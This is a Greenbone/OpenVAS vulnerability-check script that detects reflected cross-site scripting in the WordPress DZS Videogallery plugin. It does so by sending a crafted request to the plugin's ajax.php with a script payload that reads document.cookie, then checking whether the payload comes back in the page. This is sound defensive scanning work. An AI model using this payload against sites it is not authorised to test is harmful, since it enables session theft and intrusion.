CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.807610" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_tag( name: "cvss_base", value: "9.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2016-03-16 10:38:20 +0530 (Wed, 16 Mar 2016)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WordPress DZS Videogallery Plugin Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  DZS Videogallery Plugin and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET
  request and check whether it is able to read the cookie value or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - An insufficient validation of input to 'initer' parameter.

  - An insufficient validation of input to 'height' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow an
  unauthenticated remote attacker to conduct CSRF and cross-site scripting
  (xss)attacks." );
	script_tag( name: "affected", value: "WordPress DZS Videogallery version
  8.60 and prior." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/39553/" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/dzs-videogallery/ajax.php?height=&source=&type=7934f\"><script>alert(document.cookie)</script>99085&width=";
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)</script>", extra_check: "dzs-videogallery" )){
	report = http_report_vuln_url( port: http_port, url: url );
	security_message( port: http_port, data: report );
	exit( 0 );
}

